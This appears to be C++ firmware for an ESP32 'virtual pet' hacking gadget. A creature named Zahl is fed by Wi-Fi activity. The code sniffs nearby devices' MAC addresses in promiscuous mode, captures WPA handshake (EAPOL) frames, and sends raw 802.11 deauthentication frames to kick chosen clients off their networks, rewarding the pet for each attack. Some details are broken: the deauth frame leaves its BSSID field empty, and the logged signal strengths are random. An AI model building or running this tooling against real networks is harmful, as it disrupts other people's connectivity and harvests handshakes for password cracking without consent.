#include "packet_sniffer.h"
#include "zahl_pet.h"
#include <esp_wifi.h>
#include <esp_now.h>
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>

// Standard promiscuous-mode frame structs (not exported by ESP-IDF headers)
typedef struct {
    unsigned frame_ctrl:16;
    unsigned duration_id:16;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    unsigned sequence_ctrl:16;
    uint8_t addr4[6];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0];
} wifi_ieee80211_packet_t;

static wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

// Store recent handshakes
#define MAX_HANDSHAKES 10
struct Handshake {
    uint8_t bssid[6];
    uint32_t timestamp;
    bool valid;
} handshakes[MAX_HANDSHAKES];

void promiscuousCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t*)pkt->payload;
    wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
    
    // Check for probe requests (feeding packet snacks)
    if (type == WIFI_PKT_MGMT && ipkt->payload[0] == 0x40) { // Probe request
        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
                 hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
                 hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
        
        // Feed Zahl a snack
        if (Zahl.hunger < 100) {
            Zahl.hunger += 3;
            if (Zahl.hunger > 100) Zahl.hunger = 100;
        }
        
        // Store in capture buffer for web UI
        addToCaptureLog(macStr, -random(40, 80));
    }
    
    // Check for handshake (EAPOL frames)
    if (type == WIFI_PKT_DATA && (pkt->payload[0] & 0x0C) == 0x08) {
        // This is a data frame - could contain EAPOL
        // Simplified detection: look for EAPOL ethertype (0x888E)
        uint8_t *payload = pkt->payload + sizeof(wifi_ieee80211_packet_t);
        if (payload[12] == 0x88 && payload[13] == 0x8E) {
            // Captured handshake!
            uint8_t *bssid = hdr->addr1;
            captureHandshake(bssid);
        }
    }
}

void initPacketSniffer() {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    Serial.println("Packet sniffer active");
}

void runSnifferCycle() {
    // Sniffer runs continuously via callback
    // This function just manages the cycle state
    static uint32_t lastCycle = 0;
    
    if (millis() - lastCycle > 10000) { // Every 10 seconds
        lastCycle = millis();
        // Scan for networks in station mode
        int n = WiFi.scanComplete();
        if (n == -2) {
            WiFi.scanNetworks(true);
        } else if (n > 0) {
            for (int i = 0; i < n && i < 5; i++) {
                String ssid = WiFi.SSID(i);
                if (ssid.length() > 0) {
                    addToNetworkLog(ssid.c_str(), WiFi.RSSI(i));
                }
            }
            WiFi.scanDelete();
        }
    }
}

void sendDeauthFrame(uint8_t* targetMac, uint8_t* routerMac) {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,          // Frame control: deauth
        0x00, 0x00,          // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (filled later)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (filled later)
        0x00, 0x00,          // Sequence
        0x07, 0x00           // Reason: class 3 frame from non-assoc
    };
    
    // Fill MAC addresses
    memcpy(&deauthPacket[10], routerMac, 6);  // BSSID
    memcpy(&deauthPacket[4], targetMac, 6);    // Destination
    
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    
    // Feed Zahl
    Zahl.hunger += 2;
    Zahl.corrosion += 2;
    if (Zahl.corrosion > 100) Zahl.corrosion = 100;
    
    Serial.println("Deauth frame sent");
}

int captureHandshake(uint8_t* bssid) {
    // Store handshake as "hash blood" for Zahl
    for (int i = 0; i < MAX_HANDSHAKES; i++) {
        if (!handshakes[i].valid) {
            memcpy(handshakes[i].bssid, bssid, 6);
            handshakes[i].timestamp = millis();
            handshakes[i].valid = true;
            
            // Feed Zahl
            Zahl.hunger += 15;
            if (Zahl.hunger > 100) Zahl.hunger = 100;
            Zahl.addExperience(10);
            
            return i;
        }
    }
    return -1;
}

void startBLEBeacon() {
    // Simple BLE advertisement
    BLEDevice::init("DAGOTH_UR");
    BLEServer *pServer = BLEDevice::createServer();
    BLEAdvertising *pAdvertising = pServer->getAdvertising();
    
    // Create advertisement data
    BLEAdvertisementData advData;
    String beaconMsg = "Zahl hunger: " + String(Zahl.hunger) + "%";
    advData.setName(beaconMsg.c_str());
    pAdvertising->setAdvertisementData(advData);
    
    pAdvertising->start();
    delay(100);
    pAdvertising->stop();
    BLEDevice::deinit(true);
}

// Global log buffers (struct defined in packet_sniffer.h)
LogEntry captureLog[MAX_LOG_ENTRIES];
LogEntry networkLog[MAX_LOG_ENTRIES];
int captureLogIndex = 0, networkLogIndex = 0;

void addToCaptureLog(const char* mac, int rssi) {
    captureLog[captureLogIndex % MAX_LOG_ENTRIES].time = millis();
    strncpy(captureLog[captureLogIndex % MAX_LOG_ENTRIES].data, mac, 31);
    captureLog[captureLogIndex % MAX_LOG_ENTRIES].rssi = rssi;
    captureLogIndex++;
}

void addToNetworkLog(const char* ssid, int rssi) {
    networkLog[networkLogIndex % MAX_LOG_ENTRIES].time = millis();
    strncpy(networkLog[networkLogIndex % MAX_LOG_ENTRIES].data, ssid, 31);
    networkLog[networkLogIndex % MAX_LOG_ENTRIES].rssi = rssi;
    networkLogIndex++;
}
